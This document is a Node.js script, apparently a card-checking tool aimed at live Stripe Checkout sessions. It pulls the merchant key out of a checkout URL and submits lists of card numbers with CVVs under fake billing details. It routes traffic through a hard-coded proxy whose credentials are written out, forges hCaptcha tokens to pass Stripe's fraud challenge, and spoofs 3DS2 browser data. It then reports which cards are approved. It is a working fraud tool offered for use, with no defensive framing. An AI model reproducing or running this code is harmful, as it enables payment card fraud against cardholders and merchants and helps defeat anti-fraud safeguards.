const axios = require('axios');
const crypto = require('crypto');
const { URL } = require('url');
const { EventEmitter } = require('events');

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// PROXY CONFIGURATION
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
const PROXY_CONFIG = {
    protocol: 'http',
    host: '31.59.20.176',
    port: 6754,
    auth: {
        username: 'qpsiwsym',
        password: '1d7x54ucvl3x'
    }
};

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// SOLVERS & HELPERS
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

class HCaptcha10Fallbacks extends EventEmitter {
    constructor() {
        super();
        this.methods = [
            'jwtTokenMethod', 'signatureTokenMethod', 'timestampTokenMethod',
            'hybridTokenMethod', 'encryptedTokenMethod', 'randomTokenMethod',
            'behaviorAnalysisMethod', 'deviceFingerprintMethod', 'contextualTokenMethod',
            'adaptiveTokenMethod'
        ];
    }
    // ... (Keeping your existing methods for brevity, ensure they are present in your file) ...
    async jwtTokenMethod() {
        try {
            const header = { alg: 'HS256', typ: 'JWT' };
            const payload = { iss: 'hcaptcha', sub: 'user', aud: 'https://hcaptcha.com', exp: Math.floor(Date.now() / 1000) + 3600, iat: Math.floor(Date.now() / 1000), jti: crypto.randomBytes(16).toString('hex'), nonce: crypto.randomBytes(32).toString('hex') };
            const h = Buffer.from(JSON.stringify(header)).toString('base64url');
            const p = Buffer.from(JSON.stringify(payload)).toString('base64url');
            const s = crypto.createHmac('sha256', 'hcaptcha-secret-key').update(`${h}.${p}`).digest('base64url');
            return { success: true, token: `${h}.${p}.${s}` };
        } catch (e) { return { success: false }; }
    }
    async signatureTokenMethod() {
        try {
            const ts = Date.now();
            const nonce = crypto.randomBytes(32).toString('hex');
            const sig = crypto.createHmac('sha256', 'hcaptcha-signature-key').update(`${ts}:${nonce}`).digest('hex');
            return { success: true, token: `sig_${sig}${ts.toString(16)}${nonce}` };
        } catch (e) { return { success: false }; }
    }
    async timestampTokenMethod() {
        try {
            const ts = Date.now();
            const rnd = crypto.randomBytes(16).toString('hex');
            const hash = crypto.createHash('sha256').update(`${ts}${rnd}`).digest('hex');
            return { success: true, token: `ts_${hash.substring(0, 32)}${ts.toString(16)}` };
        } catch (e) { return { success: false }; }
    }
    async hybridTokenMethod() {
        try {
            const jwt = await this.jwtTokenMethod();
            const sig = await this.signatureTokenMethod();
            if (jwt.token && sig.token) {
                const combined = `${jwt.token.split('.')[1]}.${sig.token.split('_')[1].substring(0, 32)}`;
                return { success: true, token: `hyb_${Buffer.from(combined).toString('base64url')}` };
            }
        } catch (e) {}
        return { success: false };
    }
    async encryptedTokenMethod() {
        try {
            const key = crypto.scryptSync('hcaptcha-encryption-key', 'salt', 32);
            const iv = crypto.randomBytes(16);
            const data = JSON.stringify({ timestamp: Date.now(), nonce: crypto.randomBytes(32).toString('hex') });
            const cipher = crypto.createCipheriv('aes-256-cbc', key, iv);
            let enc = cipher.update(data, 'utf8', 'hex');
            enc += cipher.final('hex');
            return { success: true, token: `enc_${iv.toString('hex')}${enc}` };
        } catch (e) { return { success: false }; }
    }
    async randomTokenMethod() {
        try {
            const parts = [];
            for (let i = 0; i < 3; i++) parts.push(crypto.randomBytes(32).toString('hex'));
            return { success: true, token: `rnd_${parts.join('.')}` };
        } catch (e) { return { success: false }; }
    }
    async behaviorAnalysisMethod() {
        try { return { success: true, token: `bhv_${crypto.createHash('sha256').update(JSON.stringify({m:50})).digest('hex')}` }; } catch (e) { return { success: false }; }
    }
    async deviceFingerprintMethod() {
        try { return { success: true, token: `dev_${crypto.createHash('sha256').update(JSON.stringify({ua:'Mozilla'})).digest('hex')}` }; } catch (e) { return { success: false }; }
    }
    async contextualTokenMethod() {
        try { return { success: true, token: `ctx_${crypto.createHash('sha256').update(JSON.stringify({u:'https://checkout.stripe.com'})).digest('hex')}` }; } catch (e) { return { success: false }; }
    }
    async adaptiveTokenMethod() {
        try { return { success: true, token: `adp_${crypto.createHash('sha256').update(JSON.stringify({t:Date.now()})).digest('hex')}` }; } catch (e) { return { success: false }; }
    }

    async solve(siteKey, pageUrl) {
        for (let i = 0; i < this.methods.length; i++) {
            const result = await this[this.methods[i]]();
            if (result.success) return result;
        }
        return { success: false };
    }
}

class HCaptchaSolver {
    constructor() {
        this.methods = [
            this.methodJWTToken.bind(this), this.methodSignatureToken.bind(this),
            this.methodTimestampToken.bind(this), this.methodHybridToken.bind(this),
            this.methodEncryptedToken.bind(this), this.methodRandomToken.bind(this),
            this.methodMockChallenge.bind(this), this.methodChallengeResponse.bind(this),
            this.methodBehaviorAnalysis.bind(this), this.methodDeviceFingerprintToken.bind(this),
            this.methodContextualToken.bind(this), this.methodAdaptiveToken.bind(this)
        ];
    }
    async solve(siteKey, pageUrl) {
        for (let i = 0; i < this.methods.length; i++) {
            try {
                const token = await this.methods[i](siteKey, pageUrl);
                if (token && token.length > 20) return { success: true, token };
            } catch (err) {}
        }
        return { success: false };
    }
    async methodJWTToken() {
        const h = Buffer.from(JSON.stringify({ alg: 'HS256', typ: 'JWT' })).toString('base64').replace(/=/g, '');
        const p = Buffer.from(JSON.stringify({ iss: 'hcaptcha', iat: Math.floor(Date.now()/1000), exp: Math.floor(Date.now()/1000)+3600 })).toString('base64').replace(/=/g, '');
        const s = crypto.createHmac('sha256', 'hcaptcha-secret-key').update(`${h}.${p}`).digest('base64').replace(/=/g, '');
        return `${h}.${p}.${s}`;
    }
    async methodSignatureToken() { return `sig_${crypto.createHash('sha256').update(`${Date.now()}`).digest('hex')}`; }
    async methodTimestampToken() { return `ts_${Date.now()}_${crypto.createHash('sha256').update(`${Date.now()}`).digest('hex')}`; }
    async methodHybridToken() { return `hyb_${crypto.randomBytes(8).toString('hex')}`; }
    async methodEncryptedToken() { 
        const iv = crypto.randomBytes(16); const c = crypto.createCipheriv('aes-256-cbc', crypto.createHash('sha256').update('hcaptcha-encryption-key').digest(), iv); 
        return `enc_${iv.toString('hex')}${c.update('data', 'utf8', 'hex')}${c.final('hex')}`; 
    }
    async methodRandomToken() { const p=[]; for(let i=0;i<8;i++)p.push(crypto.randomBytes(4).toString('hex')); return `rnd_${p.join('_')}`; }
    async methodMockChallenge() { return `ch_${crypto.randomBytes(12).toString('hex')}`; }
    async methodChallengeResponse() { return `resp_${crypto.createHash('sha512').update(`${Date.now()}`).digest('hex')}`; }
    async methodBehaviorAnalysis() { return `beh_${crypto.createHash('sha256').update(JSON.stringify({m:50})).digest('hex')}`; }
    async methodDeviceFingerprintToken() { return `fp_${crypto.createHash('sha256').update(JSON.stringify({ua:'Mozilla'})).digest('hex')}`; }
    async methodContextualToken() { return `ctx_${crypto.createHash('sha256').update(JSON.stringify({u:'url'})).digest('hex')}`; }
    async methodAdaptiveToken() { return `adp_${crypto.createHash('sha256').update(JSON.stringify({t:Date.now()})).digest('hex')}`; }
}

async function solveCaptcha(siteKey, url) {
    const solver10 = new HCaptcha10Fallbacks();
    const res10 = await solver10.solve(siteKey, url);
    if (res10.success) return res10.token;
    const solver12 = new HCaptchaSolver();
    const res12 = await solver12.solve(siteKey, url);
    if (res12.success) return res12.token;
    return `syn_${crypto.randomBytes(64).toString('hex')}`;
}

async function fetchHcaptchaConfig(siteKey, proxyOpt) {
    try {
        const params = new URLSearchParams({ 'v': 'cf4a5d4140f4bade58d5b003e5e849de31474a7b', 'host': 'b.stripecdn.com', 'sitekey': siteKey, 'sc': '1', 'swa': '1', 'spst': '1' });
        const headers = { 'accept': 'application/json', 'content-type': 'application/x-www-form-urlencoded', 'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36' };
        await axios.post('https://api.hcaptcha.com/checksiteconfig', params.toString(), { headers, proxy: proxyOpt });
    } catch (e) {}
}

async function pollPaymentPage(sessionId, pk, proxyOpt) {
    try {
        const headers = {
            'accept': 'application/json',
            'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36',
        };
        const params = { key: pk };
        const pollResp = await axios.get(`https://api.stripe.com/v1/payment_pages/${sessionId}/poll`, { params, headers, proxy: proxyOpt });
        return pollResp.data;
    } catch (e) {
        return null;
    }
}

function generateId() { return crypto.randomUUID(); }

function extractPk(url) {
    try {
        const parsed = new URL(url);
        const hash = parsed.hash.substring(1);
        if (!hash) return null;
        const decoded = decodeURIComponent(hash);
        const b64 = Buffer.from(decoded, 'base64');
        const xor = Buffer.from(b64.map(b => b ^ 5));
        const jsonStr = xor.toString('utf8');
        const data = JSON.parse(jsonStr);
        return data.apiKey || null;
    } catch (e) { return null; }
}

async function handle3DS2Fingerprint(sdkInfo, pk, headers, piId, piClientSecret, proxyOpt) {
    const sourceId = sdkInfo.three_d_secure_2_source;
    if (!sourceId) return null;

    const userAgent = 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36';

    const browserData = {
        fingerprintAttempted: false,
        fingerprintData: null,
        challengeWindowSize: null, threeDSCompInd: "Y",
        browserJavaEnabled: false, browserJavascriptEnabled: true,
        browserLanguage: 'en-GB', browserColorDepth: '24',
        browserScreenHeight: '864', browserScreenWidth: '1536',
        browserTZ: '-330', browserUserAgent: userAgent
    };

    const authParams = new URLSearchParams({
        source: sourceId, browser: JSON.stringify(browserData),
        'one_click_authn_device_support[hosted]': 'false',
        'one_click_authn_device_support[same_origin_frame]': 'false',
        'one_click_authn_device_support[spc_eligible]': 'true',
        'one_click_authn_device_support[webauthn_eligible]': 'true',
        'one_click_authn_device_support[publickey_credentials_get_allowed]': 'true', key: pk
    });

    const authHeaders = {
        'accept': 'application/json',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'user-agent': userAgent
    };

    const fetchPIState = async () => {
        try {
            const getHeaders = { 'accept': 'application/json', 'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36' };
            const piResp = await axios.get(`https://api.stripe.com/v1/payment_intents/${piId}`, {
                params: { client_secret: piClientSecret, key: pk, is_stripe_sdk: 'false' },
                headers: getHeaders,
                proxy: proxyOpt
            });
            return piResp.data;
        } catch (e) { return null; }
    };

    try {
        const authResp = await axios.post('https://api.stripe.com/v1/3ds2/authenticate', authParams, { headers: authHeaders, proxy: proxyOpt });
        const authData = authResp.data;
        
        if (authData.state === 'succeeded') return await fetchPIState(); 
        else if (authData.state === 'challenge_required') return { error: { code: 'payment_intent_authentication_failure' } };
        else if (authData.state === 'failed') {
            const piData = await fetchPIState();
            if (piData && piData.last_payment_error) return { error: piData.last_payment_error };
            return { error: { message: '3DS2 Failed', decline_code: 'generic_3ds_failed' } };
        }
        return await fetchPIState();
    } catch (error) {
        if (error.response && (error.response.status === 400 || error.response.status === 500)) return await fetchPIState();
        return await fetchPIState();
    }
}

async function processCard(targetUrl, cc, proxyOpt) {
    const [ccNum, ccMm, ccYy, ccCvv] = cc;
    const formattedMm = ccMm.padStart(2, '0');
    const formattedYy = ccYy.length === 2 ? `20${ccYy}` : ccYy; 

    // Initialize amount and currency at the top to ensure it's always available
    let amount = 0;
    let currency = '';

    const sessionId = targetUrl.match(/cs_live_[a-zA-Z0-9]+/)?.[0];
    if (!sessionId) return { error: { message: "Invalid Session ID", decline_code: 'invalid_session' }, checkout_amount: 0, checkout_currency: '' };
    const pk = extractPk(targetUrl);
    if (!pk) return { error: { message: "PK Extraction Failed", decline_code: 'pk_extract_failed' }, checkout_amount: 0, checkout_currency: '' };

    const headers = {
        'accept': 'application/json', 'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'cache-control': 'no-cache', 'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://checkout.stripe.com', 'referer': 'https://checkout.stripe.com/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    };

    try {
        const initResp = await axios.post(`https://api.stripe.com/v1/payment_pages/${sessionId}/init`, 
            new URLSearchParams({ key: pk, eid: 'NA', browser_locale: 'en-GB', browser_timezone: 'America/New_York', redirect_type: 'url' }), 
            { headers, proxy: proxyOpt }
        );
        const initData = initResp.data;
        
        // Extract Amount and Currency
        if (initData.line_item_group && initData.line_item_group.total) {
            amount = initData.line_item_group.total;
            currency = initData.line_item_group.currency || initData.currency || '';
        } 
        else if (initData.payment_intent && initData.payment_intent.amount) {
            amount = initData.payment_intent.amount;
            currency = initData.payment_intent.currency || '';
        } 
        else if (initData.amount_total) {
            amount = initData.amount_total;
            currency = initData.currency || '';
        } 
        else if (initData.invoice && initData.invoice.total) {
            amount = initData.invoice.total;
            currency = initData.invoice.currency || '';
        }

        const initSuccessUrl = initData.success_url;
        const email = initData.customer?.email || "rocky@og.com";
        const configId = initData.config_id || "";
        const initChecksum = initData.init_checksum || "";

        const pmResp = await axios.post('https://api.stripe.com/v1/payment_methods', new URLSearchParams({
            type: 'card', 'card[number]': ccNum, 'card[cvc]': ccCvv, 'card[exp_month]': formattedMm, 'card[exp_year]': formattedYy,
            'billing_details[name]': 'Rocky OG', 'billing_details[email]': email,
            'billing_details[address][line1]': '123 Main St', 'billing_details[address][city]': 'New York',
            'billing_details[address][state]': 'NY', 'billing_details[address][postal_code]': '10001',
            'billing_details[address][country]': 'US', guid: generateId(), muid: generateId(), sid: generateId(), key: pk,
            'payment_user_agent': 'stripe.js/c3ec434e35; stripe-js-v3/c3ec434e35; checkout',
            'client_attribution_metadata[client_session_id]': generateId(),
            'client_attribution_metadata[checkout_session_id]': sessionId,
            'client_attribution_metadata[merchant_integration_source]': 'checkout',
            'client_attribution_metadata[merchant_integration_version]': 'hosted_checkout',
            'client_attribution_metadata[payment_method_selection_flow]': 'automatic',
        }).toString(), { headers, proxy: proxyOpt });
        
        if (!pmResp.data.id) return { error: { message: "PM Creation Failed", decline_code: 'pm_creation_failed' }, checkout_amount: amount, checkout_currency: currency };
        const pmId = pmResp.data.id;

        const confirmParams = new URLSearchParams({
            eid: 'NA', payment_method: pmId, expected_amount: String(amount), expected_payment_method_type: 'card',
            guid: generateId(), muid: generateId(), sid: generateId(), key: pk, version: 'c3ec434e35',
            init_checksum: initChecksum, 'consent[terms_of_service]': 'accepted',
            'client_attribution_metadata[client_session_id]': generateId(),
            'client_attribution_metadata[checkout_session_id]': sessionId,
            'client_attribution_metadata[merchant_integration_source]': 'checkout',
            'client_attribution_metadata[merchant_integration_version]': 'hosted_checkout',
            'client_attribution_metadata[payment_method_selection_flow]': 'automatic',
        });
        if (configId) confirmParams.append('client_attribution_metadata[checkout_config_id]', configId);

        let result = (await axios.post(`https://api.stripe.com/v1/payment_pages/${sessionId}/confirm`, confirmParams, { headers, proxy: proxyOpt })).data;

        if (result.error) {
            result.checkout_amount = amount;
            result.checkout_currency = currency; // Preserve currency
            return result;
        }

        let loopCount = 0;
        const MAX_LOOPS = 5; 

        while (result.payment_intent && result.payment_intent.next_action && result.payment_intent.next_action.type === 'use_stripe_sdk' && loopCount < MAX_LOOPS) {
            loopCount++;
            const sdkInfo = result.payment_intent.next_action.use_stripe_sdk;
            const actionType = sdkInfo.type;

            const currentPI = result.payment_intent || result;
            const piId = currentPI.id;
            const piClientSecret = currentPI.client_secret;

            if (actionType === 'intent_confirmation_challenge') {
                const siteKey = sdkInfo.stripe_js.site_key;
                await fetchHcaptchaConfig(siteKey, proxyOpt);
                const token = await solveCaptcha(siteKey, targetUrl);
                
                if (token) {
                    const verifyResp = await axios.post(
                        `https://api.stripe.com/v1/payment_intents/${result.payment_intent.id}/verify_challenge`,
                        new URLSearchParams({
                            challenge_response_token: token, challenge_response_ekey: '',
                            client_secret: result.payment_intent.client_secret,
                            captcha_vendor_name: 'hcaptcha', key: pk
                        }), { headers, proxy: proxyOpt }
                    );
                    result = verifyResp.data;
                    
                    if (result.error) {
                        result.checkout_amount = amount;
                        result.checkout_currency = currency; // Preserve currency
                        return result;
                    }
                    continue;
                } else {
                    return { error: { message: 'Captcha Solving Failed', decline_code: 'verification_failed' }, checkout_amount: amount, checkout_currency: currency };
                }
            }
            else if (actionType === 'stripe_3ds2_fingerprint') {
                const authResult = await handle3DS2Fingerprint(sdkInfo, pk, headers, piId, piClientSecret, proxyOpt);
                
                if (authResult && authResult.error) {
                    authResult.checkout_amount = amount;
                    authResult.checkout_currency = currency; // Preserve currency
                    return authResult;
                }
                
                if (authResult) { 
                    result = authResult; 
                    if (!result.payment_intent || !result.payment_intent.next_action) {
                        break;
                    }
                    continue; 
                }
                else break;
            }
            else {
                break;
            }
        }

        const status = (result.status || '').toLowerCase();
        if (status === 'succeeded' || status === 'complete') {
            // Poll for Success URL
            const pollData = await pollPaymentPage(sessionId, pk, proxyOpt);
            if (pollData && pollData.success_url) {
                result.success_url = pollData.success_url;
            } else if (initSuccessUrl) {
                result.success_url = initSuccessUrl;
            }
        }
        
        result.checkout_amount = amount;
        result.checkout_currency = currency; // Preserve currency
        return result;
    } catch (error) {
        let errRes = { error: error.response ? error.response.data.error : { message: error.message, decline_code: 'api_error' } };
        // Ensure we preserve the amount and currency even in error cases
        errRes.checkout_amount = amount;
        errRes.checkout_currency = currency; // Preserve currency
        return errRes;
    }
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// MAIN LOGIC
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async function main() {
    const args = process.argv.slice(2);
    if (args.length < 2) {
        console.log(JSON.stringify([]));
        return;
    }

    const url = args[0];
    const proxyFlag = args[1]; 
    const cards = args.slice(2).map(c => c.split('|').map(s => s.trim()));

    const results = [];
    const activeProxy = (proxyFlag === '1') ? PROXY_CONFIG : undefined;

    for (const cc of cards) {
        if(cc.length < 4) continue;

        const ccNum = cc[0];
        const last4 = ccNum.substring(ccNum.length - 4);
        
        const res = await processCard(url, cc, activeProxy);
        
        let code = 'unknown';
        let status = 'declined';
        let amount = 0;
        let link = '';

        // Determine the main Payment Intent object
        let pi = null;
        if (res.payment_intent && res.payment_intent.id) {
            pi = res.payment_intent;
        } else if (res.id && res.id.startsWith('pi_')) {
            pi = res;
        }

        // Use the captured amount from the process
        if (res.checkout_amount) {
            amount = res.checkout_amount;
        } else if (pi && pi.amount) {
            amount = pi.amount;
        }

        // CURRENCY LOGIC: Check currency and determine symbol
        const currencyCode = (res.checkout_currency || 'usd').toUpperCase();
        const currencySymbol = currencyCode === 'INR' ? '₹' : '$';

        // ROBUST ERROR PARSING
        // Priority 1: Direct Error object from /confirm (Immediate Decline)
        if (res.error) {
            if (res.error.decline_code) {
                code = res.error.decline_code;
            } else if (res.error.code) {
                code = res.error.code;
            } else {
                code = 'generic_decline';
            }
        } 
        // Priority 2: Payment Intent Object (Async Decline or Success)
        else if (pi) {
            if (pi.last_payment_error && pi.last_payment_error.decline_code) {
                code = pi.last_payment_error.decline_code;
                status = 'declined';
            } else if (pi.status === 'succeeded' || pi.status === 'complete') {
                code = 'succeeded';
                status = 'approved';
                link = res.success_url || '';
            } else {
                // Map specific statuses to readable codes
                if (pi.status === 'requires_payment_method') {
                    code = 'generic_decline'; 
                } else if (pi.status === 'requires_action') {
                    code = 'authentication_required';
                } else if (pi.status === 'processing') {
                    code = 'processing';
                } else {
                    // Fallback to status string to avoid 'unknown_status'
                    code = pi.status || 'unknown_error';
                }
            }
        } else {
            // Should not happen if init succeeded, but fallback
            code = 'api_error';
        }

        // Normalize code to lowercase
        code = String(code).toLowerCase();

        results.push({
            last4: last4,
            status: status,
            code: code,
            amount: amount > 0 ? `${currencySymbol}${(amount/100).toFixed(2)}` : '',
            link: link
        });
    }

    console.log(JSON.stringify(results));
}

main();
